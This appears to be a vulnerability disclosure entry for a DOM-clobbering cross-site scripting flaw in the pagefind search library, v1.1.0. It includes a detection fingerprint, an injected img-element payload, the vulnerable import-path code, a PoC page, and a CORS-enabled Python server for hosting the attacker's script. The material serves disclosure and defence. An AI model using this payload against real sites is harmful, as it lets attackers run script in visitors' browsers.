## pagefind

### Meta

+ Library: pagefind
+ Stars: 3.3K
+ Version: v1.1.0
+ Fingerprint: `typeof PagefindUI !== 'undefined'`
+ Payload: ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>```
+ Impact: XSS
+ CVE: N/A
+ Foundby: TheHulk

### Library

Built locally
+ `https://github.com/cloudcannon/pagefind`

### Vulnerable Code Snippet

```javascript
en = new URL(document.currentScript.src).pathname.match(/^(.*\/)(?:pagefind-)?ui.js.*$/)[1]
```

```javascript
g = await import(`${r}pagefind.js`)
```

## PoC

```html
<html>
site
<img name="currentScript" src="blob:http://localhost:8000/ui.js"></img>

<link href="pagefind/pagefind-ui.css" rel="stylesheet">
<script src="pagefind/pagefind-ui.js"></script>
<div id="search"></div>
<script>
    window.addEventListener('DOMContentLoaded', (event) => {
        new PagefindUI({ element: "#search", showSubResults: true });
    });
</script>
</html>
```

run pagefind to create index. create `pagefind.js`, needs to be hosted with Access-Control-Allow-Origin set. 

```python
#!/usr/bin/env python
from http import server

class MyHTTPRequestHandler(server.SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        server.SimpleHTTPRequestHandler.end_headers(self)


if __name__ == '__main__':
    server.test(HandlerClass=MyHTTPRequestHandler)
```
